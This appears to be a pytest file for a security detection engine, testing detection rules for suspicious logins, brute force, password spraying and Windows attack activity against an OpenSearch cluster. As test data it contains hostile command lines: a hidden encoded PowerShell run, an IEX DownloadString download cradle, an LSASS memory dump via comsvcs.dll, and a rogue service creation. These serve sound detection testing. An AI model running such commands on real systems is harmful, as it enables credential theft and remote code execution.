"""The per-rule test set spec §29 requires: no rule ships without it.

For every shipped rule there is a positive case and a negative case; for
every *windowed* rule there are also the four cases that make a threshold
rule trustworthy — exactly at the threshold, one below it, out of window,
and split across entities (different user, different source address) so
that a bucket boundary error cannot pass unnoticed.

The windowed cases run against a real OpenSearch cluster, because a
threshold rule is a claim about an aggregation query. Asserting it against a
fake client would test the fake.
"""

import uuid
from datetime import UTC, datetime, timedelta
from pathlib import Path
from typing import Any

import pytest

from app.core.opensearch import get_opensearch
from app.detection.conditions import evaluate_node
from app.detection.engine import StreamingEngine
from app.detection.loader import load_rules
from app.detection.schema import DetectionRule, RuleException, RuleStatus
from app.detection.windowed import WindowedEvaluator
from app.services.index_management import NORMALIZED_ALIAS, bootstrap_indices

RULES_DIR = Path(__file__).resolve().parents[3] / "rules"
RULES: dict[str, DetectionRule] = {rule.rule_id: rule for rule in load_rules(RULES_DIR).rules}

WINDOW_END = datetime(2026, 9, 13, 12, 0, tzinfo=UTC)


def _base_event(**overrides: Any) -> dict[str, Any]:
    document: dict[str, Any] = {
        "event_id": str(uuid.uuid4()),
        "tenant_id": str(uuid.uuid4()),
        "timestamp": WINDOW_END.isoformat(),
        "source_type": "syslog_udp",
        "schema_version": "lunatic-1",
    }
    document.update(overrides)
    return document


async def _matches(rule_id: str, document: dict[str, Any]) -> bool:
    engine = StreamingEngine([RULES[rule_id]])
    return bool(await engine.evaluate({**document, "tenant_id": document.get("tenant_id", "t")}))


# ---------------------------------------------------------------------------
# Streaming rules: positive / negative / near miss
# ---------------------------------------------------------------------------


async def test_auth_003_privileged_login_from_outside() -> None:
    external_root = _base_event(
        **{
            "class": "Authentication",
            "authentication": {"outcome": "success"},
            "user": {"name": "root"},
            "source_ip": "203.0.113.10",
        }
    )
    assert await _matches("AUTH-003", external_root) is True

    # different IP: the same login from inside the estate is routine
    assert await _matches("AUTH-003", {**external_root, "source_ip": "10.20.30.40"}) is False
    # different user: an unprivileged account from outside is not this rule
    assert await _matches("AUTH-003", {**external_root, "user": {"name": "alice"}}) is False
    # negative: a failed privileged login is AUTH-001's business, not this rule's
    assert (
        await _matches(
            "AUTH-003", {**external_root, "authentication": {"outcome": "failure"}}
        )
        is False
    )
    # an event with no source address cannot be judged and must not match
    no_source = {key: value for key, value in external_root.items() if key != "source_ip"}
    assert await _matches("AUTH-003", no_source) is False


async def test_win_001_encoded_powershell() -> None:
    encoded = _base_event(
        process={"name": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"},
        command_line="powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0AA==",
    )
    assert await _matches("WIN-001", encoded) is True

    # abbreviated switches are the common evasion and must still match
    for switch in ("-e", "-en", "-enc", "-EncodedCommand", "/enc"):
        variant = {
            **encoded,
            "command_line": f"powershell {switch} SQBFAFgAKABOAGUAdwAtAE8AYgBqAA==",
        }
        assert await _matches("WIN-001", variant) is True, switch

    # negative: ordinary PowerShell use, including a switch that starts -e
    assert (
        await _matches(
            "WIN-001",
            {**encoded, "command_line": r"powershell -ExecutionPolicy Bypass -File C:\ops\b.ps1"},
        )
        is False
    )
    # different process: the same argument shape from another binary is not
    # this rule (the rule is anchored on the interpreter)
    assert (
        await _matches("WIN-001", {**encoded, "process": {"name": r"C:\tools\custom.exe"}})
        is False
    )


async def test_win_002_download_cradle() -> None:
    cradle = _base_event(
        command_line=(
            "powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://x/a.ps1')\""
        )
    )
    assert await _matches("WIN-002", cradle) is True
    assert await _matches("WIN-002", {**cradle, "command_line": "powershell -c Get-Process"}) is False


async def test_win_003_lsass_dumping() -> None:
    dump = _base_event(
        command_line=(
            r"rundll32.exe C:\windows\system32\comsvcs.dll, MiniDump 624 C:\temp\lsass.dmp full"
        )
    )
    assert await _matches("WIN-003", dump) is True

    # negative: a dumping tool used on a different process is out of scope
    assert (
        await _matches("WIN-003", {**dump, "command_line": "procdump.exe -ma notepad.exe"})
        is False
    )
    # negative: merely naming lsass is not enough
    assert (
        await _matches("WIN-003", {**dump, "command_line": "tasklist | findstr lsass"}) is False
    )


async def test_win_004_log_cleared() -> None:
    assert await _matches("WIN-004", _base_event(event_code="1102", hostname="dc01")) is True
    assert await _matches("WIN-004", _base_event(event_code="104", hostname="dc01")) is True
    assert await _matches("WIN-004", _base_event(event_code="4624", hostname="dc01")) is False


async def test_win_005_office_spawns_interpreter() -> None:
    macro = _base_event(
        process={
            "name": r"C:\Windows\System32\cmd.exe",
            "parent_name": r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE",
        }
    )
    assert await _matches("WIN-005", macro) is True

    # different parent: explorer spawning cmd is a person, not a document
    assert (
        await _matches(
            "WIN-005",
            {**macro, "process": {**macro["process"], "parent_name": r"C:\Windows\explorer.exe"}},
        )
        is False
    )
    # different child: Word opening a printer dialog helper is not a shell
    assert (
        await _matches(
            "WIN-005",
            {**macro, "process": {**macro["process"], "name": r"C:\Windows\splwow64.exe"}},
        )
        is False
    )


async def test_win_006_service_installation() -> None:
    assert await _matches("WIN-006", _base_event(event_code="7045", hostname="srv01")) is True
    assert (
        await _matches(
            "WIN-006",
            _base_event(
                process={"name": r"C:\Windows\System32\sc.exe"},
                command_line=r"sc.exe create evil binPath= C:\Users\Public\evil.exe",
            ),
        )
        is True
    )
    # negative: querying a service is not creating one
    assert (
        await _matches(
            "WIN-006",
            _base_event(
                process={"name": r"C:\Windows\System32\sc.exe"}, command_line="sc.exe query spooler"
            ),
        )
        is False
    )


# ---------------------------------------------------------------------------
# Windowed rules, against a real cluster
# ---------------------------------------------------------------------------


@pytest.fixture(scope="session")
async def evaluator() -> WindowedEvaluator:
    client = get_opensearch()
    await bootstrap_indices(client)
    # No suppression store: these tests assert threshold behaviour, and
    # suppression is covered on its own in test_detection_engine.py.
    return WindowedEvaluator(client)


async def _index(documents: list[dict[str, Any]]) -> None:
    client = get_opensearch()
    operations: list[dict[str, Any]] = []
    for document in documents:
        operations.append({"index": {"_index": NORMALIZED_ALIAS, "_id": document["event_id"]}})
        operations.append(document)
    response = await client.bulk(body=operations, refresh=True)
    assert not response["errors"], response


def _failed_logon(
    tenant_id: str, *, user: str, source_ip: str, minutes_ago: float
) -> dict[str, Any]:
    return _base_event(
        tenant_id=tenant_id,
        timestamp=(WINDOW_END - timedelta(minutes=minutes_ago)).isoformat(),
        **{
            "class": "Authentication",
            "authentication": {"outcome": "failure"},
            "user": {"name": user},
            "source_ip": source_ip,
        },
    )


async def test_auth_001_brute_force_threshold_boundary(evaluator: WindowedEvaluator) -> None:
    rule = RULES["AUTH-001"]
    assert rule.window is not None
    threshold = rule.window.threshold
    tenant_id = str(uuid.uuid4())

    # One below the threshold: nothing fires.
    await _index(
        [
            _failed_logon(tenant_id, user="alice", source_ip="203.0.113.5", minutes_ago=index)
            for index in range(threshold - 1)
        ]
    )
    assert await evaluator.run(rule, tenant_id, now=WINDOW_END) == []

    # Exactly at the threshold: it fires, once, for the right entity.
    await _index([_failed_logon(tenant_id, user="alice", source_ip="203.0.113.5", minutes_ago=0.5)])
    matches = await evaluator.run(rule, tenant_id, now=WINDOW_END)

    assert len(matches) == 1
    match = matches[0]
    assert match.entity == {"user.name": "alice", "source_ip": "203.0.113.5"}
    assert match.evidence["observed"] == threshold
    assert match.evidence["threshold"] == threshold
    assert match.event_ids, "a windowed match must cite the events behind it"


async def test_auth_001_ignores_events_outside_the_window(evaluator: WindowedEvaluator) -> None:
    rule = RULES["AUTH-001"]
    assert rule.window is not None
    tenant_id = str(uuid.uuid4())
    window_minutes = rule.window.duration_seconds / 60

    await _index(
        [
            _failed_logon(
                tenant_id,
                user="alice",
                source_ip="203.0.113.5",
                minutes_ago=window_minutes + 1 + index,
            )
            for index in range(rule.window.threshold + 3)
        ]
    )
    assert await evaluator.run(rule, tenant_id, now=WINDOW_END) == []


async def test_auth_001_counts_per_user_and_per_source(evaluator: WindowedEvaluator) -> None:
    """The bucket boundary test: failures spread across users, or across
    source addresses, are different entities and must not add up."""
    rule = RULES["AUTH-001"]
    assert rule.window is not None
    tenant_id = str(uuid.uuid4())
    threshold = rule.window.threshold

    documents = []
    for index in range(threshold):
        # different user each time, same address
        documents.append(
            _failed_logon(tenant_id, user=f"user{index}", source_ip="198.51.100.7", minutes_ago=index * 0.1)
        )
        # same user each time, different address
        documents.append(
            _failed_logon(tenant_id, user="bob", source_ip=f"198.51.100.{100 + index}", minutes_ago=index * 0.1)
        )
    await _index(documents)

    assert await evaluator.run(rule, tenant_id, now=WINDOW_END) == []


async def test_auth_001_is_tenant_scoped(evaluator: WindowedEvaluator) -> None:
    """Another tenant's failures must never count toward this tenant's
    threshold (THREAT_MODEL.md §3.2)."""
    rule = RULES["AUTH-001"]
    assert rule.window is not None
    tenant_id, other_tenant = str(uuid.uuid4()), str(uuid.uuid4())

    await _index(
        [
            _failed_logon(other_tenant, user="alice", source_ip="203.0.113.5", minutes_ago=index * 0.1)
            for index in range(rule.window.threshold + 2)
        ]
    )
    assert await evaluator.run(rule, tenant_id, now=WINDOW_END) == []
    assert len(await evaluator.run(rule, other_tenant, now=WINDOW_END)) == 1


async def test_auth_002_password_spraying_counts_distinct_users(
    evaluator: WindowedEvaluator,
) -> None:
    rule = RULES["AUTH-002"]
    assert rule.window is not None and rule.window.distinct_field == "user.name"
    threshold = rule.window.threshold
    tenant_id = str(uuid.uuid4())

    # Many attempts against FEW accounts: brute force, not spraying. This is
    # the case a naive doc_count threshold would get wrong.
    await _index(
        [
            _failed_logon(tenant_id, user="alice", source_ip="198.51.100.9", minutes_ago=index * 0.1)
            for index in range(threshold * 3)
        ]
    )
    assert await evaluator.run(rule, tenant_id, now=WINDOW_END) == []

    # One attempt each against many accounts: spraying.
    await _index(
        [
            _failed_logon(
                tenant_id, user=f"sprayed{index}", source_ip="198.51.100.9", minutes_ago=index * 0.1
            )
            for index in range(threshold)
        ]
    )
    matches = await evaluator.run(rule, tenant_id, now=WINDOW_END)
    assert len(matches) == 1
    assert matches[0].entity == {"source_ip": "198.51.100.9"}
    assert matches[0].evidence["observed"] >= threshold


async def test_auth_002_counts_per_source_address(evaluator: WindowedEvaluator) -> None:
    rule = RULES["AUTH-002"]
    assert rule.window is not None
    tenant_id = str(uuid.uuid4())

    # The same breadth of accounts, spread over many source addresses, is
    # not one sprayer.
    await _index(
        [
            _failed_logon(
                tenant_id,
                user=f"sprayed{index}",
                source_ip=f"192.0.2.{index + 1}",
                minutes_ago=index * 0.1,
            )
            for index in range(rule.window.threshold + 5)
        ]
    )
    assert await evaluator.run(rule, tenant_id, now=WINDOW_END) == []


async def test_auth_004_repeated_lockouts(evaluator: WindowedEvaluator) -> None:
    rule = RULES["AUTH-004"]
    assert rule.window is not None
    threshold = rule.window.threshold
    tenant_id = str(uuid.uuid4())

    lockouts = [
        _base_event(
            tenant_id=tenant_id,
            timestamp=(WINDOW_END - timedelta(minutes=index)).isoformat(),
            event_code="4740",
            user={"name": "carol"},
        )
        for index in range(threshold - 1)
    ]
    await _index(lockouts)
    assert await evaluator.run(rule, tenant_id, now=WINDOW_END) == []

    await _index(
        [
            _base_event(
                tenant_id=tenant_id,
                timestamp=WINDOW_END.isoformat(),
                event_code="4740",
                user={"name": "carol"},
            )
        ]
    )
    matches = await evaluator.run(rule, tenant_id, now=WINDOW_END)
    assert len(matches) == 1
    assert matches[0].entity == {"user.name": "carol"}


async def test_a_windowed_rule_excludes_excepted_events_from_its_count(
    evaluator: WindowedEvaluator,
) -> None:
    """An exception must remove events from the *count*, not filter matches
    afterwards — otherwise benign activity still pushes a rule over its
    threshold."""
    rule = RULES["AUTH-001"]
    assert rule.window is not None
    tenant_id = str(uuid.uuid4())
    excepted = rule.model_copy(
        update={
            "exceptions": [
                RuleException.model_validate(
                    {
                        "reason": "the backup host fails on credential rotation",
                        "conditions": {
                            "field": "source_ip",
                            "operator": "equals",
                            "value": "203.0.113.50",
                        },
                    }
                )
            ]
        }
    )

    await _index(
        [
            _failed_logon(tenant_id, user="dave", source_ip="203.0.113.50", minutes_ago=index * 0.1)
            for index in range(rule.window.threshold + 2)
        ]
    )

    assert len(await evaluator.run(rule, tenant_id, now=WINDOW_END)) == 1, "control case"
    assert await evaluator.run(excepted, tenant_id, now=WINDOW_END) == []


async def test_a_disabled_windowed_rule_is_not_run(evaluator: WindowedEvaluator) -> None:
    rule = RULES["AUTH-001"].model_copy(update={"status": RuleStatus.DISABLED})
    tenant_id = str(uuid.uuid4())
    await _index(
        [
            _failed_logon(tenant_id, user="erin", source_ip="203.0.113.60", minutes_ago=index * 0.1)
            for index in range(10)
        ]
    )
    assert await evaluator.run(rule, tenant_id, now=WINDOW_END) == []


def test_every_shipped_rule_has_a_test_in_this_file() -> None:
    """The rule that keeps the rest of this file honest: a new rule cannot be
    added to the pack without its test set (spec §29)."""
    tested = Path(__file__).read_text()
    for rule_id in RULES:
        assert rule_id.lower().replace("-", "_") in tested, f"{rule_id} ships without tests"


def test_conditions_alone_do_not_fire_a_windowed_rule() -> None:
    """A single matching event satisfies a windowed rule's conditions but
    must never be a detection on its own."""
    rule = RULES["AUTH-001"]
    single = _base_event(
        **{
            "class": "Authentication",
            "authentication": {"outcome": "failure"},
            "user": {"name": "alice"},
        }
    )
    assert evaluate_node(rule.conditions, single) is True
    assert StreamingEngine([rule]).rules == []
